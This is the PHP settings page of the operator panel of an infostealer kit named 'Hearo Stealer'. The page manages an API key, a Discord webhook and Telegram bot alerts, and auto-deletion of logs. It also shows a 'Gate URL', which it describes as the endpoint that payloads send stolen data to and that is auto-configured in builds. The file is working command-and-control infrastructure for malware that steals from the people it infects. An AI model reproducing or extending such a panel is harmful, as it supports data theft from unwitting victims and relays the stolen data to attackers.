<?php
require_once 'xeff/includes/config.php';
require_once 'xeff/includes/auth.php';
requireAuth();

$user = getCurrentUser();
$msg = '';
$msgType = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'change_password') {
        $current = $_POST['current_password'] ?? '';
        $newPass = $_POST['new_password'] ?? '';
        $confirm = $_POST['confirm_password'] ?? '';

        if (!password_verify($current, $user['password_hash'])) {
            $msg = 'Current password is incorrect.';
            $msgType = 'error';
        } elseif (strlen($newPass) < 4) {
            $msg = 'New password too short.';
            $msgType = 'error';
        } elseif ($newPass !== $confirm) {
            $msg = 'Passwords do not match.';
            $msgType = 'error';
        } else {
            $hash = password_hash($newPass, PASSWORD_BCRYPT);
            $db->prepare("UPDATE users SET password_hash = ? WHERE id = ?")->execute([$hash, $user['id']]);
            $msg = 'Password updated successfully.';
            $msgType = 'success';
        }
    }

    if ($action === 'update_webhook') {
        $webhook = trim($_POST['webhook_url'] ?? '');
        $db->prepare("UPDATE users SET webhook_url = ? WHERE id = ?")->execute([$webhook, $user['id']]);
        $msg = 'Webhook URL updated.';
        $msgType = 'success';
        $user['webhook_url'] = $webhook;
    }

    if ($action === 'update_telegram') {
        $botToken = trim($_POST['telegram_bot_token'] ?? '');
        $chatId   = trim($_POST['telegram_chat_id'] ?? '');
        $db->prepare("UPDATE users SET telegram_bot_token = ?, telegram_chat_id = ? WHERE id = ?")->execute([$botToken, $chatId, $user['id']]);
        $msg = 'Telegram settings updated.';
        $msgType = 'success';
        $user['telegram_bot_token'] = $botToken;
        $user['telegram_chat_id'] = $chatId;
    }

    if ($action === 'update_autodelete') {
        $days = (int)($_POST['auto_delete_days'] ?? 0);
        $db->prepare("UPDATE users SET auto_delete_days = ? WHERE id = ?")->execute([$days, $user['id']]);
        $msg = 'Auto-delete setting updated.';
        $msgType = 'success';
        $user['auto_delete_days'] = $days;
    }

    if ($action === 'regenerate_key') {
        $newKey = bin2hex(random_bytes(16));
        $db->prepare("UPDATE users SET api_key = ? WHERE id = ?")->execute([$newKey, $user['id']]);
        $user['api_key'] = $newKey;
        $msg = 'API key regenerated.';
        $msgType = 'success';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Settings — Hearo Stealer</title>
    <link rel="icon" href="xeff/assets/logo.png" type="image/png">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="xeff/css/elite.css">
    <link rel="stylesheet" href="xeff/assets/theme.css">
</head>
<body>
    <div class="ambient-glow"></div>
    <div class="noise"></div>

    <?php include 'xeff/includes/navbar.php'; ?>

    <div class="container">
        <h1>Settings</h1>

        <?php if ($msg): ?><div class="msg <?= $msgType ?>"><?= sanitize($msg) ?></div><?php endif; ?>

        <!-- API Key -->
        <div class="section">
            <div class="section-title"><i class="fa-solid fa-key"></i> API Key</div>
            <div class="key-display">
                <code id="apiKey"><?= sanitize($user['api_key']) ?></code>
                <button class="btn-copy" onclick="navigator.clipboard.writeText(document.getElementById('apiKey').textContent); this.textContent='Copied!';">Copy</button>
            </div>
            <form method="POST" style="margin-top:10px;">
                <input type="hidden" name="action" value="regenerate_key">
                <button type="submit" class="btn-sm" onclick="return confirm('Regenerate API key? Old key will stop working.');">Regenerate Key</button>
            </form>
        </div>

        <!-- Change Password -->
        <div class="section">
            <div class="section-title"><i class="fa-solid fa-lock"></i> Change Password</div>
            <form method="POST">
                <input type="hidden" name="action" value="change_password">
                <div class="form-group"><label>Current Password</label><input type="password" name="current_password" class="form-input" required></div>
                <div class="form-group"><label>New Password</label><input type="password" name="new_password" class="form-input" required></div>
                <div class="form-group"><label>Confirm Password</label><input type="password" name="confirm_password" class="form-input" required></div>
                <button type="submit" class="btn-save">Update Password</button>
            </form>
        </div>

        <!-- Webhook -->
        <div class="section">
            <div class="section-title"><i class="fa-brands fa-discord"></i> Discord Webhook</div>
            <form method="POST">
                <input type="hidden" name="action" value="update_webhook">
                <div class="form-group"><label>Webhook URL</label><input type="text" name="webhook_url" class="form-input" value="<?= sanitize($user['webhook_url'] ?? '') ?>" placeholder="https://discord.com/api/webhooks/..."></div>
                <button type="submit" class="btn-save">Save Webhook</button>
            </form>
        </div>

        <!-- Telegram -->
        <div class="section">
            <div class="section-title"><i class="fa-brands fa-telegram"></i> Telegram Notifications</div>
            <form method="POST">
                <input type="hidden" name="action" value="update_telegram">
                <div class="form-group"><label>Bot Token</label><input type="text" name="telegram_bot_token" class="form-input" value="<?= sanitize($user['telegram_bot_token'] ?? '') ?>" placeholder="123456:ABC-DEF..."></div>
                <div class="form-group"><label>Chat ID</label><input type="text" name="telegram_chat_id" class="form-input" value="<?= sanitize($user['telegram_chat_id'] ?? '') ?>" placeholder="123456789"></div>
                <button type="submit" class="btn-save">Save Telegram Settings</button>
            </form>
        </div>

        <!-- Auto Delete -->
        <div class="section">
            <div class="section-title"><i class="fa-solid fa-clock"></i> Auto-Delete Logs</div>
            <form method="POST">
                <input type="hidden" name="action" value="update_autodelete">
                <div class="form-group">
                    <label>Delete logs older than</label>
                    <select name="auto_delete_days" class="form-input">
                        <option value="0" <?= ($user['auto_delete_days'] ?? 0) == 0 ? 'selected' : '' ?>>Never</option>
                        <option value="1" <?= ($user['auto_delete_days'] ?? 0) == 1 ? 'selected' : '' ?>>1 day</option>
                        <option value="3" <?= ($user['auto_delete_days'] ?? 0) == 3 ? 'selected' : '' ?>>3 days</option>
                        <option value="7" <?= ($user['auto_delete_days'] ?? 0) == 7 ? 'selected' : '' ?>>7 days</option>
                        <option value="14" <?= ($user['auto_delete_days'] ?? 0) == 14 ? 'selected' : '' ?>>14 days</option>
                        <option value="30" <?= ($user['auto_delete_days'] ?? 0) == 30 ? 'selected' : '' ?>>30 days</option>
                    </select>
                </div>
                <button type="submit" class="btn-save">Save</button>
            </form>
        </div>

        <!-- Gate URL Info -->
        <div class="section">
            <div class="section-title"><i class="fa-solid fa-link"></i> Gate URL</div>
            <div class="key-display">
                <code id="gateUrl"><?= sanitize(getGateUrl()) ?></code>
                <button class="btn-copy" onclick="navigator.clipboard.writeText(document.getElementById('gateUrl').textContent); this.textContent='Copied!';">Copy</button>
            </div>
            <p style="font-size:11px; color:var(--text-muted); margin-top:8px;">This is the endpoint your payloads send data to. Auto-configured in builds.</p>
        </div>
    </div>
</body>
</html>
